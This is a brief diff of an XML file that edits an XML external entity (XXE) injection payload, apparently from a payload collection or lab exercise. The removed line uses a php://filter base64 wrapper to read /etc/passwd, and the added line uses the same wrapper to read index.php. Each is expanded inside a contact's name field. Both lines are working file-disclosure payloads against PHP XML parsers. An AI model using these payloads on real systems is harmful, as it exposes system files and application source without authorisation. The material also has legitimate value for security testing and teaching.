@@ -1,4 +1,4 @@
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=///etc/passwd"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
 <contacts>
   <contact>
     <name>Jean &xxe; Dupont</name>
